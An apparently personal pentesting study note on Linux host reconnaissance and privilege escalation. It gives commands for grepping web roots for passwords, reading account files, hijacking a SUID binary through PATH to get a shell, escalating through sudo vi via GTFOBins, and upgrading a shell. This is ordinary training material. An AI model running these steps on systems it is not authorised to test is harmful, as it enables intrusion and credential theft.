---
title: Host-Based Reconnaissance
draft: false
tags:
  - tag1
  - tag2
NeedsReview: true
---
### **Host-Based Reconnaissance** ==**(Work In Progress)**==

> [!summary] Core Concept  
Gather information about users, groups, files, and services directly from the target system. This helps identify privilege escalation vectors and data exposure risks.

#### 🗂️ Web Application Path and File Enumeration

Web content is often stored at:

```bash
/var/www/html/
````

To search for potential credentials or sensitive data:

```bash
cat /var/www/html/* | grep -i passw
```

---

#### 👤 User and Group Enumeration

Basic commands to inspect system users and groups:

```bash
cat /etc/passwd
cat /etc/group
id
```

Find all files owned by a user or group:

```bash
find / -user <username> 2>/dev/null
find / -group <groupname> 2>/dev/null
find / -user <username> -group <groupname> -ls
```

---

#### 🔐 Exploiting SUID Permissions

Look for suspicious SUID binaries with `s` in user/group permissions:

```bash
ls -l /path/to/file
# Example: -rwsr-xr--
```

If a program with SUID runs commands like `cat`, you can hijack the command:

```bash
echo '/bin/sh' > /tmp/cat
chmod +x /tmp/cat
export PATH=/tmp:$PATH
```

---

#### 🧠 Recon for Mixed Stacks (PHP + SQL)

If the system uses both PHP and SQL, credentials may be found in:

```bash
/var/www/html/
```

Look for database config files and connection strings in clear text.

---

#### 🔓 sudo -l for Privilege Escalation Opportunities

List user’s sudo permissions:

```bash
sudo -l
```

**Example:**  
User `postgres` may run `vi` on a PostgreSQL config file:

```bash
(ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

Refer to GTFOBins to escalate using known program vulnerabilities:  
🔗 [GTFOBins ](https://gtfobins.github.io/))

Steps:

```bash
:set shell=/bin/sh
:shell
```

---

#### 🧽 Beautify the Shell (Post-Escalation)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---
